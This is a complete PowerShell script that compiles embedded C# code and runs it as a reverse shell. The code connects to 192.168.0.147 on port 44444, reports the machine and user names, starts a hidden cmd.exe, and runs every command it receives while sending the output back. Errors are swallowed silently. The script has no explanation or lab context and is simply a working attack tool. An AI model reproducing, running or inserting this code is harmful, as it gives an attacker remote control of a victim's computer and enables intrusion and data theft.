$source = @'
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

public class P {
    public static void Main() {
        try {
            TcpClient c = new TcpClient("192.168.0.147", 44444);
            NetworkStream s = c.GetStream();
            StreamReader r = new StreamReader(s, Encoding.UTF8);
            StreamWriter w = new StreamWriter(s, Encoding.UTF8);
            w.AutoFlush = true;

            w.WriteLine(string.Format("[*] {0} / {1}", Environment.MachineName, Environment.UserName));

            Process p = new Process();
            p.StartInfo.FileName               = "cmd.exe";
            p.StartInfo.RedirectStandardInput  = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError  = true;
            p.StartInfo.UseShellExecute        = false;
            p.StartInfo.CreateNoWindow         = true;
            p.Start();

            p.OutputDataReceived += delegate(object sender, DataReceivedEventArgs e) {
                if (!string.IsNullOrEmpty(e.Data)) w.WriteLine(e.Data);
            };
            p.ErrorDataReceived += delegate(object sender, DataReceivedEventArgs e) {
                if (!string.IsNullOrEmpty(e.Data)) w.WriteLine(e.Data);
            };

            p.BeginOutputReadLine();
            p.BeginErrorReadLine();

            string line;
            while ((line = r.ReadLine()) != null) {
                if (string.IsNullOrWhiteSpace(line)) continue;
                if (line.Trim().ToLower() == "exit") break;
                p.StandardInput.WriteLine(line);
            }

            try { p.Kill(); } catch { }
            c.Close();
        } catch { }
    }
}
'@

Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop
[P]::Main()
